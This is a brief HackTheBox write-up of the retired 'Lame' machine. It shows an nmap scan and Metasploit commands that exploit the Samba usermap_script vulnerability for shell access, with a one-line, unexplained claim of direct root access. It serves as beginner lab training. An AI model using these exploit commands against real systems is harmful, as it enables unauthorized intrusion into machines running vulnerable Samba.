---
title: HTB - Lame
layout: writeup
date: 2026-04-13
dificultad: Easy
plataforma: HackTheBox
lang: en
---
# 🧠 HTB - Lame

## 🔍 Enumeration

Initial scan:

```bash
nmap -sC -sV 10.10.10.3
```

### 📡 Services detected

-FTP
-SSH
- Samba (⚠️ vulnerable)

---

## 💥 Exploitation

Vulnerability detected in Samba (`usermap_script`)

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

✔️ Access achieved as a user

---

## 🔐 Privilege Escalation

No complex climbing necessary.

The system is misconfigured and allows direct root access.

---

## 🏁 Conclusion

Very simple machine:

- Ideal for beginners  
- Introduces basic operating concepts  
- Good first contact with HackTheBox

---

## 🏷️ Tags

- #HTB  
- #Easy  
- #Samba